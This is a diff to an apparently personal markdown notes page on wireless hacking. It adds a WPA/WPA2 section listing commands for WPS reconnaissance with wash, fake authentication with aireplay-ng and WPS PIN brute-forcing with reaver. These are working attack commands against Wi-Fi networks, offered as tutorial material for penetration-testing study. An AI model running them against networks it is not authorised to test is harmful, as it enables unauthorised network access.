@@ -63,7 +63,15 @@ Just wait for some time, then after receiving enough  packets in the `#Data` col
 
 ### wpa / wpa2 hacking.
 
+`wash --interface wlan0mon` a wps recon tool to search around for wps enabled AP/routers.
 
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p><code>wash</code></p></figcaption></figure>
+
+`aireplay-ng --fakeauth 30 -a targetMacAddr -c wirelessAdapterMacAddr wlan0mon` This creates association with the target network every 30 seconds.
+
+`reaver --bssid targetBssid --channel targetChannel -i wlan0mon -vvv --no-associate` running reaver to carryout bruteforcing.
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
